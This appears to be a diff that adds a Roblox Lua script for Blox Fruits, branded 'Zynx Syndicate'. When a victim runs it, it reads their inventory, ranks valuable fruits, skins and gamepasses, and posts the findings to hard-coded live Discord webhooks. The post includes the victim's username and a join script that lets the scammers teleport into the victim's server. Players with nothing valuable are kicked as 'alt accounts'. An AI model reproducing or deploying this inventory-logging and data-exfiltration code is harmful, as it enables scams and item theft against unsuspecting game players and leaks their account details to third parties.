@@ -1,0 +1,703 @@
+-- Zynx Syndicate - Part 4: VALUABLE ITEMS ONLY (ADMIN + MEMBER WEBHOOKS)
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TeleportService = game:GetService("TeleportService")
+
+-- Webhook Configuration
+local ADMIN_WEBHOOK = "https://discord.com/api/webhooks/1428586195171938417/ejqtCuOJOM8F46xTuNygD-o84kgU802MZFVMSe5vQ9H3NZlO19YAR8Z-dILXMKBFqH-a"
+local MEMBER_WEBHOOK = "https://discord.com/api/webhooks/1426615725656768658/ujFBJ0TgHTirRnEt5kneB_8BY8TDEDCllM8X84zJWcRW6_k3qf0RNLFQELiolQXvvIJu" -- Replace with your member webhook
+local ZYNX_LOGO = "https://i.postimg.cc/8CbPpQCy/Copilot-20251016-162707.png"
+local DISCORD_INVITE = "https://discord.gg/rEAE2Xs6"
+
+-- Anti-Spam Security
+local lastExecution = 0
+local COOLDOWN_TIME = 30 -- 30 seconds cooldown
+
+-- Admin Priority Fruits (HIGH VALUE)
+local ADMIN_FRUITS = {
+    "Permanent", "Perm", -- ALL permanent fruits (Rocket, Bomb, Buddha, Kitsune, Dragon, etc.)
+    "Dragon", "Kitsune", "Yeti", -- Specific mythical fruits
+    -- Skins
+    "Permanent Dragon Token", "Purple Lightning", "Red Lightning", "Yellow Lightning", "Green Lightning",
+    "Rose Quartz Diamond", "Emerald Diamond", "Topaz Diamond", "Ruby Diamond", "Dragon Token", "Eclipse",
+    "Super Spirit Pain", "Torment Pain", "Sadness Pain", "Frustration Pain", "Celestial Pain",
+    "Eagle Requiem", "Eagle Glacier", "Eagle Matrix", "Celebration Bomb", "Azura Bomb", "Thermite Bomb", "Nuclear Bomb"
+}
+
+-- Member Priority Fruits (MEDIUM VALUE)
+local MEMBER_FRUITS = {
+    "Buddha", "Portal", "Gas", "Spirit", "Dough", "T-Rex", "Mammoth", "Leopard"
+}
+
+-- Gamepass keywords (ALL GAMEPASSES - ADMIN ONLY)
+local gamepassKeywords = {
+    "Fruit Notifier", "Dark Blade", "Mythical Scrolls", "Legendary Scrolls", "+1 Fruit Storage",
+    "2x Mastery", "2x Money", "2x Boss Drops", "Fast Boats"
+}
+
+-- Improved Sea Detection
+local function GetSea()
+    local workspace = game:GetService("Workspace")
+    
+    -- Check for Sea 3 first (most specific)
+    if workspace:FindFirstChild("GreatTree") then return "Sea 3" end
+    if workspace:FindFirstChild("Hydra") then return "Sea 3" end
+    if workspace:FindFirstChild("Mansion") then return "Sea 3" end
+    if workspace:FindFirstChild("Castle on the Sea") then return "Sea 3" end
+    if workspace:FindFirstChild("Haunted Castle") then return "Sea 3" end
+    
+    -- Check for Sea 2
+    if workspace:FindFirstChild("FrozenDimension") then return "Sea 2" end
+    if workspace:FindFirstChild("FrozenVillage") then return "Sea 2" end
+    if workspace:FindFirstChild("IceCastle") then return "Sea 2" end
+    if workspace:FindFirstChild("Awakened Ice Admiral") then return "Sea 2" end
+    
+    -- Check Sea 1 locations
+    if workspace:FindFirstChild("MarineFord") then return "Sea 1" end
+    if workspace:FindFirstChild("Jungle") then return "Sea 1" end
+    if workspace:FindFirstChild("Pirate Village") then return "Sea 1" end
+    if workspace:FindFirstChild("Desert") then return "Sea 1" end
+    
+    -- Fallback: Check current player level and islands
+    local LocalPlayer = Players.LocalPlayer
+    if LocalPlayer then
+        local level = LocalPlayer.Data.Level.Value
+        if level >= 700 then
+            return "Sea 2"
+        elseif level >= 1500 then
+            return "Sea 3"
+        end
+    end
+    
+    return "Sea 1" -- Default
+end
+
+-- Check if script is executed in Sea 1
+local function CheckSea1Restriction()
+    local sea = GetSea()
+    if sea == "Sea 1" then
+        print("❌ SCRIPT EXECUTED IN SEA 1 - KICKING PLAYER...")
+        wait(2)
+        local LocalPlayer = Players.LocalPlayer
+        if LocalPlayer then
+            LocalPlayer:Kick("🚫 Do not execute script in 1st Sea")
+        end
+        return true
+    end
+    return false
+end
+
+-- Anti-Spam Security Check
+local function CheckCooldown()
+    local currentTime = tick()
+    if currentTime - lastExecution < COOLDOWN_TIME then
+        print("❌ COOLDOWN ACTIVE - Please wait " .. math.floor(COOLDOWN_TIME - (currentTime - lastExecution)) .. " seconds")
+        return true
+    end
+    lastExecution = currentTime
+    return false
+end
+
+-- Executor Detection
+local function GetExecutor()
+    if syn and syn.request then return "Synapse X" end
+    if getexecutorname then return getexecutorname() end
+    if identifyexecutor then return identifyexecutor() end
+    return "Delta"
+end
+
+-- Check if item is in a list (FIXED FUNCTION)
+local function IsInList(itemName, keywordList)
+    for _, keyword in pairs(keywordList) do
+        if string.find(itemName, keyword) then
+            return true
+        end
+    end
+    return false
+end
+
+-- Get VALUABLE items only (no Rarity 1) - SHOWS ALL COUNTS
+local function GetValuableItems()
+    local categories = {
+        permanentFruits = {},
+        skins = {},
+        gamepasses = {},
+        fruits = {
+            ["4"] = {}, -- Mythical
+            ["3"] = {}, -- Legendary  
+            ["2"] = {}  -- Rare (NO RARITY 1)
+        }
+    }
+    
+    -- Skin keywords
+    local skinKeywords = {
+        "Permanent Dragon Token", "Purple Lightning", "Red Lightning", "Yellow Lightning", "Green Lightning",
+        "Rose Quartz Diamond", "Emerald Diamond", "Topaz Diamond", "Ruby Diamond", "Dragon Token", "Eclipse",
+        "Super Spirit Pain", "Torment Pain", "Sadness Pain", "Frustration Pain", "Celestial Pain",
+        "Eagle Requiem", "Eagle Glacier", "Eagle Matrix", "Celebration Bomb", "Azura Bomb", "Thermite Bomb", "Nuclear Bomb"
+    }
+    
+    local success, inventory = pcall(function()
+        local Remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
+        return Remote:InvokeServer("getInventory")
+    end)
+    
+    if success and inventory then
+        for i, item in pairs(inventory) do
+            if item and item.Type == "Blox Fruit" then
+                local itemName = item.Name
+                local rarity = tostring(item.Rarity or 1)
+                local count = item.Count or 1
+                local value = item.Value or 0
+                
+                -- Check for PERMANENT fruits (any rarity)
+                if string.find(itemName, "Permanent") or string.find(itemName, "Perm") then
+                    table.insert(categories.permanentFruits, {
+                        name = itemName,
+                        count = count,
+                        value = value
+                    })
+                
+                -- Check for SKINS
+                elseif IsInList(itemName, skinKeywords) then
+                    table.insert(categories.skins, {
+                        name = itemName,
+                        count = count,
+                        value = value
+                    })
+                
+                -- Check for GAMEPASSES
+                elseif IsInList(itemName, gamepassKeywords) then
+                    table.insert(categories.gamepasses, {
+                        name = itemName,
+                        count = count,
+                        value = value
+                    })
+                
+                -- Regular fruits (ONLY Rarity 2,3,4 - NO RARITY 1)
+                elseif categories.fruits[rarity] then
+                    table.insert(categories.fruits[rarity], {
+                        name = itemName,
+                        count = count,
+                        value = value
+                    })
+                end
+            end
+        end
+    end
+    
+    -- Sort each category by value (highest to lowest)
+    for rarity, fruits in pairs(categories.fruits) do
+        table.sort(fruits, function(a, b) return a.value > b.value end)
+    end
+    table.sort(categories.permanentFruits, function(a, b) return a.value > b.value end)
+    table.sort(categories.skins, function(a, b) return a.value > b.value end)
+    table.sort(categories.gamepasses, function(a, b) return a.value > b.value end)
+    
+    return categories
+end
+
+-- Generate Join Script
+local function GenerateJoinScript()
+    local placeId = game.PlaceId
+    local jobId = game.JobId
+    
+    local joinScript = string.format([[
+p=%s j="%s"
+if game.PlaceId~=p then
+queue_on_teleport('wait(5) if game.JobId~=j then game.TeleportService:TeleportToPlaceInstance(p,j) end')
+game.ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
+else
+game.TeleportService:TeleportToPlaceInstance(p,j)
+end
+    ]], placeId, jobId)
+    
+    return joinScript
+end
+
+-- SIMPLE FRUIT COUNTER (ADDED)
+local function CountAllFruits()
+    print("🍊 COUNTING ALL FRUITS IN INVENTORY...")
+    
+    local success, inventory = pcall(function()
+        local Remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
+        return Remote:InvokeServer("getInventory")
+    end)
+    
+    if success and inventory then
+        local totalFruits = 0
+        local fruitCounts = {}
+        
+        -- Count all fruits
+        for i, item in pairs(inventory) do
+            if item and item.Type == "Blox Fruit" then
+                local fruitName = item.Name
+                local count = item.Count or 1
+                
+                totalFruits = totalFruits + count
+                fruitCounts[fruitName] = (fruitCounts[fruitName] or 0) + count
+            end
+        end
+        
+        -- Display results
+        print("📊 COMPLETE INVENTORY COUNT:")
+        print("🍊 TOTAL FRUIT ITEMS: " .. totalFruits)
+        print("🎯 UNIQUE FRUIT TYPES: " .. #inventory)
+        
+        print("🔢 DETAILED COUNTS:")
+        for fruitName, count in pairs(fruitCounts) do
+            print("   " .. fruitName .. " = " .. count)
+        end
+        
+        return totalFruits, fruitCounts
+    else
+        print("❌ Failed to get inventory")
+        return 0, {}
+    end
+end
+
+-- Send Admin Webhook (HIGH VALUE ITEMS)
+local function SendAdminWebhook(inventory, totalFruits, totalValuableFruits, playerCount, sea)
+    local LocalPlayer = Players.LocalPlayer
+    local joinScript = GenerateJoinScript()
+    
+    local payload = {
+        ["embeds"] = {{
+            ["title"] = "🔱 Zynx Syndicate - Valuable Items",
+            ["description"] = "Premium Inventory Only\n[Join Discord](" .. DISCORD_INVITE .. ")",
+            ["color"] = 16753920,
+            ["thumbnail"] = {["url"] = ZYNX_LOGO},
+            ["fields"] = {
+                {
+                    ["name"] = "👤 Player Info",
+                    ["value"] = "User: " .. LocalPlayer.Name .. 
+                               "\n*Sea:* " .. sea .. 
+                               "\n*Total Fruits:* " .. totalFruits ..
+                               "\n*Valuable Fruits:* " .. totalValuableFruits .. 
+                               "\n*Perm Fruits:* " .. #inventory.permanentFruits ..
+                               "\n*Skins:* " .. #inventory.skins ..
+                               "\n*Gamepasses:* " .. #inventory.gamepasses ..
+                               "\n*Players:* " .. playerCount,
+                    ["inline"] = true
+                }
+            },
+            ["footer"] = {
+                ["text"] = "Zynx Syndicate • Valuable Items Only",
+                ["icon_url"] = ZYNX_LOGO
+            }
+        }}
+    }
+    
+    -- Add PERMANENT FRUITS section (ALL rarities) - SHOWS ALL COUNTS
+    if #inventory.permanentFruits > 0 then
+        local permList = {}
+        for _, fruit in pairs(inventory.permanentFruits) do
+            -- ALWAYS show count, even if it's 1
+            table.insert(permList, fruit.name .. " (" .. fruit.count .. ")")
+        end
+        table.insert(payload.embeds[1].fields, {
+            ["name"] = "🔮 Permanent Fruits - " .. #inventory.permanentFruits,
+            ["value"] = "" .. table.concat(permList, "\n") .. "",
+            ["inline"] = false
+        })
+    end
+    
+    -- Add SKINS section - SHOWS ALL COUNTS
+    if #inventory.skins > 0 then
+        local skinsList = {}
+        for _, skin in pairs(inventory.skins) do
+            -- ALWAYS show count, even if it's 1
+            table.insert(skinsList, skin.name .. " (" .. skin.count .. ")")
+        end
+        table.insert(payload.embeds[1].fields, {
+            ["name"] = "🎨 Rare Skins - " .. #inventory.skins,
+            ["value"] = "" .. table.concat(skinsList, "\n") .. "",
+            ["inline"] = false
+        })
+    end
+    
+    -- Add GAMEPASSES section - SHOWS ALL COUNTS
+    if #inventory.gamepasses > 0 then
+        local gamepassList = {}
+        for _, gamepass in pairs(inventory.gamepasses) do
+            -- ALWAYS show count, even if it's 1
+            table.insert(gamepassList, gamepass.name .. " (" .. gamepass.count .. ")")
+        end
+        table.insert(payload.embeds[1].fields, {
+            ["name"] = "🎮 Gamepasses - " .. #inventory.gamepasses,
+            ["value"] = "" .. table.concat(gamepassList, "\n") .. "",
+            ["inline"] = false
+        })
+    end
+    
+    -- Add valuable fruits by rarity (4→3→2) - NO RARITY 1 - SHOWS ALL COUNTS
+    if #inventory.fruits["4"] > 0 then
+        local rarity4List = {}
+        for _, fruit in pairs(inventory.fruits["4"]) do
+            -- ALWAYS show count, even if it's 1
+            table.insert(rarity4List, fruit.name .. " (" .. fruit.count .. ")")
+        end
+        table.insert(payload.embeds[1].fields, {
+            ["name"] = "💎 Mythical (Rarity 4) - " .. #inventory.fruits["4"],
+            ["value"] = "" .. table.concat(rarity4List, "\n") .. "",
+            ["inline"] = false
+        })
+    end
+    
+    if #inventory.fruits["3"] > 0 then
+        local rarity3List = {}
+        for _, fruit in pairs(inventory.fruits["3"]) do
+            -- ALWAYS show count, even if it's 1
+            table.insert(rarity3List, fruit.name .. " (" .. fruit.count .. ")")
+        end
+        table.insert(payload.embeds[1].fields, {
+            ["name"] = "🌟 Legendary (Rarity 3) - " .. #inventory.fruits["3"],
+            ["value"] = "" .. table.concat(rarity3List, "\n") .. "",
+            ["inline"] = false
+        })
+    end
+    
+    if #inventory.fruits["2"] > 0 then
+        local rarity2List = {}
+        for _, fruit in pairs(inventory.fruits["2"]) do
+            -- ALWAYS show count, even if it's 1
+            table.insert(rarity2List, fruit.name .. " (" .. fruit.count .. ")")
+        end
+        table.insert(payload.embeds[1].fields, {
+            ["name"] = "🔵 Rare (Rarity 2) - " .. #inventory.fruits["2"],
+            ["value"] = "" .. table.concat(rarity2List, "\n") .. "",
+            ["inline"] = false
+        })
+    end
+    
+    -- Add join script
+    table.insert(payload.embeds[1].fields, {
+        ["name"] = "📜 Join Script",
+        ["value"] = "lua\n" .. joinScript .. "\n",
+        ["inline"] = false
+    })
+    
+    local success, result = pcall(function()
+        if syn and syn.request then
+            local response = syn.request({
+                Url = ADMIN_WEBHOOK,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(payload)
+            })
+            return response.Success
+        end
+        
+        if request then
+            request({
+                Url = ADMIN_WEBHOOK,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(payload)
+            })
+            return true
+        end
+        
+        return false
+    end)
+    
+    return success
+end
+
+-- Send Member Webhook (MEDIUM VALUE ITEMS)
+local function SendMemberWebhook(inventory, totalFruits, totalValuableFruits, playerCount, sea)
+    local LocalPlayer = Players.LocalPlayer
+    local joinScript = GenerateJoinScript()
+    
+    local payload = {
+        ["embeds"] = {{
+            ["title"] = "🔱 Zynx Syndicate - Valuable Items",
+            ["description"] = "Premium Inventory Only\n[Join Discord](" .. DISCORD_INVITE .. ")",
+            ["color"] = 16753920,
+            ["thumbnail"] = {["url"] = ZYNX_LOGO},
+            ["fields"] = {
+                {
+                    ["name"] = "👤 Player Info",
+                    ["value"] = "User: " .. LocalPlayer.Name .. 
+                               "\n*Sea:* " .. sea .. 
+                               "\n*Total Fruits:* " .. totalFruits ..
+                               "\n*Valuable Fruits:* " .. totalValuableFruits .. 
+                               "\n*Perm Fruits:* " .. #inventory.permanentFruits ..
+                               "\n*Skins:* " .. #inventory.skins ..
+                               "\n*Gamepasses:* " .. #inventory.gamepasses ..
+                               "\n*Players:* " .. playerCount,
+                    ["inline"] = true
+                }
+            },
+            ["footer"] = {
+                ["text"] = "Zynx Syndicate • Valuable Items Only",
+                ["icon_url"] = ZYNX_LOGO
+            }
+        }}
+    }
+    
+    -- Add PERMANENT FRUITS section (ALL rarities) - SHOWS ALL COUNTS
+    if #inventory.permanentFruits > 0 then
+        local permList = {}
+        for _, fruit in pairs(inventory.permanentFruits) do
+            -- ALWAYS show count, even if it's 1
+            table.insert(permList, fruit.name .. " (" .. fruit.count .. ")")
+        end
+        table.insert(payload.embeds[1].fields, {
+            ["name"] = "🔮 Permanent Fruits - " .. #inventory.permanentFruits,
+            ["value"] = "" .. table.concat(permList, "\n") .. "",
+            ["inline"] = false
+        })
+    end
+    
+    -- Add SKINS section - SHOWS ALL COUNTS
+    if #inventory.skins > 0 then
+        local skinsList = {}
+        for _, skin in pairs(inventory.skins) do
+            -- ALWAYS show count, even if it's 1
+            table.insert(skinsList, skin.name .. " (" .. skin.count .. ")")
+        end
+        table.insert(payload.embeds[1].fields, {
+            ["name"] = "🎨 Rare Skins - " .. #inventory.skins,
+            ["value"] = "" .. table.concat(skinsList, "\n") .. "",
+            ["inline"] = false
+        })
+    end
+    
+    -- Add GAMEPASSES section - SHOWS ALL COUNTS
+    if #inventory.gamepasses > 0 then
+        local gamepassList = {}
+        for _, gamepass in pairs(inventory.gamepasses) do
+            -- ALWAYS show count, even if it's 1
+            table.insert(gamepassList, gamepass.name .. " (" .. gamepass.count .. ")")
+        end
+        table.insert(payload.embeds[1].fields, {
+            ["name"] = "🎮 Gamepasses - " .. #inventory.gamepasses,
+            ["value"] = "" .. table.concat(gamepassList, "\n") .. "",
+            ["inline"] = false
+        })
+    end
+    
+    -- Add valuable fruits by rarity (4→3→2) - NO RARITY 1 - SHOWS ALL COUNTS
+    if #inventory.fruits["4"] > 0 then
+        local rarity4List = {}
+        for _, fruit in pairs(inventory.fruits["4"]) do
+            -- ALWAYS show count, even if it's 1
+            table.insert(rarity4List, fruit.name .. " (" .. fruit.count .. ")")
+        end
+        table.insert(payload.embeds[1].fields, {
+            ["name"] = "💎 Mythical (Rarity 4) - " .. #inventory.fruits["4"],
+            ["value"] = "" .. table.concat(rarity4List, "\n") .. "",
+            ["inline"] = false
+        })
+    end
+    
+    if #inventory.fruits["3"] > 0 then
+        local rarity3List = {}
+        for _, fruit in pairs(inventory.fruits["3"]) do
+            -- ALWAYS show count, even if it's 1
+            table.insert(rarity3List, fruit.name .. " (" .. fruit.count .. ")")
+        end
+        table.insert(payload.embeds[1].fields, {
+            ["name"] = "🌟 Legendary (Rarity 3) - " .. #inventory.fruits["3"],
+            ["value"] = "" .. table.concat(rarity3List, "\n") .. "",
+            ["inline"] = false
+        })
+    end
+    
+    if #inventory.fruits["2"] > 0 then
+        local rarity2List = {}
+        for _, fruit in pairs(inventory.fruits["2"]) do
+            -- ALWAYS show count, even if it's 1
+            table.insert(rarity2List, fruit.name .. " (" .. fruit.count .. ")")
+        end
+        table.insert(payload.embeds[1].fields, {
+            ["name"] = "🔵 Rare (Rarity 2) - " .. #inventory.fruits["2"],
+            ["value"] = "" .. table.concat(rarity2List, "\n") .. "",
+            ["inline"] = false
+        })
+    end
+    
+    -- Add join script
+    table.insert(payload.embeds[1].fields, {
+        ["name"] = "📜 Join Script",
+        ["value"] = "lua\n" .. joinScript .. "\n",
+        ["inline"] = false
+    })
+    
+    local success, result = pcall(function()
+        if syn and syn.request then
+            local response = syn.request({
+                Url = MEMBER_WEBHOOK,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(payload)
+            })
+            return response.Success
+        end
+        
+        if request then
+            request({
+                Url = MEMBER_WEBHOOK,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(payload)
+            })
+            return true
+        end
+        
+        return false
+    end)
+    
+    return success
+end
+
+-- Check if player has any priority fruits
+local function HasPriorityFruits(inventory)
+    local hasAdmin = false
+    local hasMember = false
+    
+    -- Check inventory for admin fruits
+    for _, item in pairs(inventory.permanentFruits) do
+        if IsInList(item.name, ADMIN_FRUITS) then
+            hasAdmin = true
+            break
+        end
+    end
+    
+    for _, item in pairs(inventory.skins) do
+        if IsInList(item.name, ADMIN_FRUITS) then
+            hasAdmin = true
+            break
+        end
+    end
+    
+    for _, item in pairs(inventory.gamepasses) do
+        if IsInList(item.name, ADMIN_FRUITS) then
+            hasAdmin = true
+            break
+        end
+    end
+    
+    for _, item in pairs(inventory.fruits["4"]) do
+        if IsInList(item.name, ADMIN_FRUITS) then
+            hasAdmin = true
+            break
+        end
+        if IsInList(item.name, MEMBER_FRUITS) then
+            hasMember = true
+            break
+        end
+    end
+    
+    for _, item in pairs(inventory.fruits["3"]) do
+        if IsInList(item.name, ADMIN_FRUITS) then
+            hasAdmin = true
+            break
+        end
+        if IsInList(item.name, MEMBER_FRUITS) then
+            hasMember = true
+            break
+        end
+    end
+    
+    for _, item in pairs(inventory.fruits["2"]) do
+        if IsInList(item.name, ADMIN_FRUITS) then
+            hasAdmin = true
+            break
+        end
+        if IsInList(item.name, MEMBER_FRUITS) then
+            hasMember = true
+            break
+        end
+    end
+    
+    return hasAdmin, hasMember
+end
+
+-- Main Webhook Function
+local function SendWebhook()
+    local LocalPlayer = Players.LocalPlayer
+    local sea = GetSea()
+    local inventory = GetValuableItems()
+    local playerCount = #Players:GetPlayers()
+    
+    -- Get complete fruit counts
+    local totalFruits, detailedCounts = CountAllFruits()
+    
+    -- Calculate totals
+    local totalValuableFruits = #inventory.fruits["4"] + #inventory.fruits["3"] + #inventory.fruits["2"]
+    local hasAdminFruits, hasMemberFruits = HasPriorityFruits(inventory)
+
+    print("📊 VALUABLE ITEMS ONLY:")
+    print("🌊 Sea: " .. sea)
+    print("🍊 Total All Fruits: " .. totalFruits)
+    print("💎 Valuable Fruits: " .. totalValuableFruits)
+    print("👑 Admin Fruits: " .. tostring(hasAdminFruits))
+    print("🔹 Member Fruits: " .. tostring(hasMemberFruits))
+    print("🔮 Permanent Fruits: " .. #inventory.permanentFruits)
+    print("🎨 Skins: " .. #inventory.skins)
+    print("🎮 Gamepasses: " .. #inventory.gamepasses)
+
+    -- DECISION LOGIC: Admin first, then Member, then kick if low
+    if hasAdminFruits then
+        print("👑 ADMIN HIT DETECTED! Sending to admin webhook...")
+        local success = SendAdminWebhook(inventory, totalFruits, totalValuableFruits, playerCount, sea)
+        if success then
+            print("✅ ADMIN WEBHOOK SENT SUCCESSFULLY!")
+            return true
+        else
+            print("❌ Admin webhook failed")
+            return false
+        end
+        
+    elseif hasMemberFruits then
+        print("🔹 MEMBER HIT DETECTED! Sending to member webhook...")
+        local success = SendMemberWebhook(inventory, totalFruits, totalValuableFruits, playerCount, sea)
+        if success then
+            print("✅ MEMBER WEBHOOK SENT SUCCESSFULLY!")
+            return true
+        else
+            print("❌ Member webhook failed")
+            return false
+        end
+        
+    else
+        print("❌ ALT ACCOUNT DETECTED - KICKING PLAYER...")
+        -- Wait a moment then kick
+        wait(2)
+        if LocalPlayer then
+            LocalPlayer:Kick("🚫 Alt account detected ")
+        end
+        return false
+    end
+end
+
+-- Execute
+print("🔱 Starting VALUABLE ITEMS ONLY VERSION (ADMIN + MEMBER WEBHOOKS)...")
+
+-- Security Checks
+if CheckSea1Restriction() then
+    return
+end
+
+if CheckCooldown() then
+    return
+end
+
+local success = SendWebhook()
+
+if success then
+    print("🚀 Webhook sent successfully based on inventory priority!")
+else
+    print("💀 Player kicked - Alt account detected")
+end
